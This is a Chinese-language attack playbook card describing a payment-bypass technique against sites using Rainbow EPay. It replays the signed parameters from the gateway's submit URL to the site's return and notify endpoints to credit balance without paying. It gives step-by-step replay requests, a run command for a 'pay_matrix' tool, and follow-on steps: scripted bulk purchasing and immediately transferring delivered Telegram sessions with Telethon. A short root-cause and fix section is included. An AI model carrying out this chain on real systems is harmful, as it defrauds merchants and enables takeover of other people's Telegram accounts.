# 彩虹易支付 submit→return/notify 回放免付充值 — 手法

> 全文参考（脱敏）：（开源包不收个案摘记）（2026-08-11，bot2）  
> 挂靠：`秦百胜·假契.md` · `杀招/秦百胜·回响` · `易付·回响.md`（对照，勿混）  
> **仅授权 targets**；耗余额/大规模拉库存先问。

---

## 0. 一句话

业务站对接**彩虹易支付**时，若 `return`/`notify` 与跳转 `submit` **共用同一参数集 + 同一 MD5 密钥**验签，且 **return 也会把订单标已付**，则：建充值单 → 从网关 submit URL **原样抽出全部参数+sign** → 回放到业务 `/pay/rainbow/return` 与 `/pay/rainbow/notify` → **免付到账**。  
不依赖爆破商户密钥；密钥打不开时仍可能通。

与 `易付·回响.md` 的区别：那条打的是**外挂 EPay 收银台自己的** `/pay/notify/{payId}/`（表单2）；本卡打的是**业务站自己的** rainbow return/notify（表单1/submit 参数回放）。

---

## 1. 适用指纹（号铺 / 充值站常见）

| 层 | 指纹 |
|----|------|
| 前端 | Laravel + 会员充值；`payment_method` 含 `usdt.trc20` 等 |
| 支付路由 | `/user/recharge/submit` → 302 到彩虹 `submit.php`；业务侧 `/pay/rainbow/return`、`/pay/rainbow/notify` |
| 网关 | 彩虹易支付（聚合）；字段 `pid/type/out_trade_no/notify_url/return_url/name/money/sign/sign_type` |
| 旁路资产 | 开放 `POST /user/api-key/apply`；`/openapi/v1` HMAC；TG 号铺 bot；晴玖客服；session 发货 zip |

同时满足「有 rainbow return/notify」+「submit 带完整 sign」再套本卡。路径名可换（`/pay/epay/return` 等），**模式**是 submit 参数集回放。

---

## 2. 攻击链（报告已达成标准）

```text
注册账号
  →（可选）POST /user/api-key/apply → 全站商品/库存可见
  → POST /user/recharge/submit {amount, payment_method}
  → 302 → 彩虹 submit.php?...&sign=...
  → 提取 submit 查询串全部参数（含 sign）
  → GET  /pay/rainbow/return?<全部参数>   → 「充值成功」页
  → POST /pay/rainbow/notify  同参数        → 200 success
  → 余额增加（无需真付）
  → POST /payment/create + /payment/balance 批量下单
  → 下载发货 zip / session
```

报告实测口径（脱敏）：多轮小额累计到账；大额 submit 回放亦回 success；再配合无频控批量购，DMZ=库存 TG session。

## 3. 复现步骤（授权作业清单）

```text
① scope 确认；支付网关异 host → scope_expand / pay_matrix --pay-url 静默并入
② 注册/登录测试号；记初始余额
③ POST 充值 submit（最小额或授权额度）→ 捕获 Location / HTML 里 submit.php URL
④ 解析参数集（缺一不可对照表）：
     pid, type, out_trade_no, notify_url, return_url, name, money, sign, sign_type
⑤ 原样：
     GET  {业务}/pay/rainbow/return?{query}
     POST {业务}/pay/rainbow/notify   (form 或同 query，按站实测)
⑥ 查余额接口 / 个人中心：增量 = money
⑦ 固化：forge_repro + STATUS；再谈下单/拉库存（大规模先问）
```

### 成功口径

| 级 | 标准 |
|----|------|
| L1 | return 页展示充值成功文案 |
| L2 | notify 返回 `success`/`ok` |
| L3 | **余额接口增值 = 回放 money**（硬条件；仅 L1/L2 不算） |
| L4 | 用余额完成下单发货 / 出 session（业务 DMZ） |

### 失败对照（报告诚实项）

| 尝试 | 预期用途 | 报告结果 |
|------|----------|----------|
| 离线/远程爆破彩虹商户 KEY | 任意伪造 notify | 长随机串，常见字典未命中 |
| 复用 openapi `app_secret` 当支付 KEY | 密钥复用 | 不匹配 |
| 网关 admin + OCR | 拿后台 | WAF 拦 POST |
| 客服默认凭据 / chat IDOR | 旁路用户数据 | 未打穿 |
| 他人订单下载 IDOR | 偷 session | 归属校验在 |

**启示**：KEY 打不开 ≠ 假付不通；优先测 **submit 回放**，再爆破 KEY。

## 4. 原理（学什么）

```text
合法流：用户真付 → 彩虹用商户 KEY 签回调 → 业务 notify 验签 → 标已付

缺陷流：业务在「跳转 submit」时已用同一 KEY 算好 sign
       → 攻击者未付款，把这份「预签名参数」直接送给业务 return/notify
       → 验签通过（参数未改）→ 业务误标已付
```

根因组合：

1. **return 与 notify 职责混淆**：return（浏览器回跳）也执行入账，或与 notify 同逻辑。  
2. **submit 签名 ≡ 回调签名**：无独立 `trade_status`/独立密钥/服务端订单态校验（未要求「仅彩虹 IP + 已支付态」）。  
3. **无支付结果权威源**：不向彩虹 `api.php?act=order` 二次确认。

修复对照（报告 §9）：notify/return 独立参数集或独立密钥；**禁止 return 标记支付**；入账仅信任严格 notify + 查单。

## 5. 号铺场景的后置链（报告配套）

假付到账后常见放大（仍须授权+成本确认）：

| 洞/弱点 | 端点/行为 | 作用 |
|---------|-----------|------|
| F-02 开放 API key | `POST /user/api-key/apply` 无审核 | 全站库存情报 + 程序化下单 |
| F-03 无频控 | `/payment/create` → `/payment/balance` | 脚本批量抽库存 |
| F-04 qty 宽容 | `qty=0/-1/abc` 归一 | 低危；金额服务端重算则无免费 |
| session 时效 | 发货 json + twoFA | **立刻** Telethon/tdata 转移；批量易被卖家作废 |

资产拓扑速查（报告 §1）：运营前端 · openapi HMAC · 彩虹网关 · 晴玖客服 · TG bot · 文档站（签规范泄露）· session_duplicator · 接码 GetHTML。

## 6. 与本库其它手法对照

| 手法 | 打点 | 要 KEY？ |
|------|------|----------|
| **本卡 submit 回放** | 业务 `/pay/rainbow/return\|notify` | **否**（用 submit 已有 sign） |
| 松散假签 `sign:true` | 业务 callback | 否 |
| 合法 MD5 | 业务/网关 notify | **要** KEY |
| `易付·回响` | 外挂 EPay `/pay/notify/{payId}/` | 用表单2 sign（非商户 KEY 爆破） |
| `autopay-CF头伪造资金链` | 源站 + `CF-Connecting-IP` | 要源站可达 |

`pay_matrix` 已支持：

```bash
python3 炼蛊房/pay_matrix.py \
  --base https://业务站 \
  --submit-url 'https://彩虹/submit.php?pid=...&sign=...' \
  --case <案卷> --site-scope 授权范围/scope.<站>.json
# 可选：--return-path /pay/rainbow/return --notify-path /pay/rainbow/notify
```

产出 `案卷/pay_matrix/forge_matrix.json`（mode=`rainbow_submit_replay`）。interesting 只看响应文案，**须另查余额**才算 L3。

## 7. Triage

| 现象 | 级 | 复工条件 |
|------|----|----------|
| 有 `/pay/rainbow/*` 或充值 302 到彩虹 submit | **A** 优先本卡 | 一笔最小充值单 + 回放验余额 |
| return 只展示、notify 严校验且二次查单 | 假付 **B/C** | KEY / 源码 / 旁路 |
| 假付通但风控改密/代理限速 | **B** | 本地稳定 IP + 新号复验 L3 |
| 只要库存 session、假付已通 | 后置 **A**（成本先问） | 频控/API key 策略确认 |

复工条件示例：

- [ ] 充值 submit 捕获完整 `sign` 参数集  
- [ ] return+notify 回放后余额接口增值  
- [ ]（号铺）API key 可申请且 `/payment/balance` 无验证码
